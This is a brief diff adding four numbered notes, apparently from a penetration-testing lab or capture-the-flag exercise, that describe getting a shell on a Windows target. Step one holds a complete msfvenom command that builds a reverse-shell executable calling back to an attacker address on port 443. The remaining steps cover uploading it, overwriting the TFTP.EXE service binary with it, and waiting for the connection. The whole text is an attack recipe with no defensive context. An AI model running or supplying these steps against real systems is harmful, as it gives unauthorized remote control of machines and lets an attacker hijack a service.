@@ -1,0 +1,4 @@
+1. Generate msfvenom payload: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.249 LPORT=443 -f exe > evil.exe 
+2. Upload the file to the target
+3. Replace the TFTP.EXE with the evil shell
+4. Setup listener and wait for shell to catch
